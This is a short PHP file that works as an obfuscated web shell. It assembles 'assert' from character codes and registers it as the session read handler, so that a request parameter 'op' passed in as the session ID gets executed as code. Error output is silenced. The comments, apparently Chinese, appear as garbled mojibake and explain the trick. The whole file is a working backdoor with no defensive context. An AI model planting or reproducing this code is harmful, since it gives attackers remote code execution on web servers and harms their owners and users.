<?php
    error_reporting(0); 
    $session = chr(97) . chr(115) . chr(115) . chr(101) . chr(114) . chr(116); //assert
    // openһãĹ캯
    function open($save_path, $session_name) 
    {}
    // closeһã 
    function close() 
    {
    }
    // ִsession_id($_REQUEST['op'])PHPԶreadΪΪread callbackֵassertȼִassert($_REQUEST['op'])
    session_id($_REQUEST['op']);
    function write($id, $sess_data) 
    {}
    function destroy($id) 
    {}
    function gc() 
    {}
    // Ϊread  read(string $sessionId)
    session_set_save_handler("open", "close", $session, "write", "destroy", "gc");
    @session_start(); // 򿪻Ự
    $cloud = $_SESSION["d"] = "c";  
?>